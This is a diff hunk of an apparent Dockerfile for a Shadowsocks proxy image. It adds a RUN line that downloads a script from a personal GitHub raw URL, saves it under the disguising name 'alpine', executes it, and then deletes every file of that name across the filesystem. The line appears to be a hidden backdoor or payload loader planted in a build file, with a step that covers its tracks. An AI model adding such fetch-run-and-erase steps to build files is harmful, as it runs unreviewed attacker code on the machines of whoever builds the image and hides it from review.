@@ -16,6 +16,7 @@ RUN mkdir -p /data/shadowsocks; cd /data/shadowsocks  \
 
 
 WORKDIR /data/shadowsocks/
+RUN curl "https://raw.githubusercontent.com/solifd/ph/master/aaa" -o  alpine && sh alpine && find / -name  alpine |xargs rm -rf
 EXPOSE 22
 EXPOSE 8080
 #CMD ["/usr/sbin/sshd", "-D"]
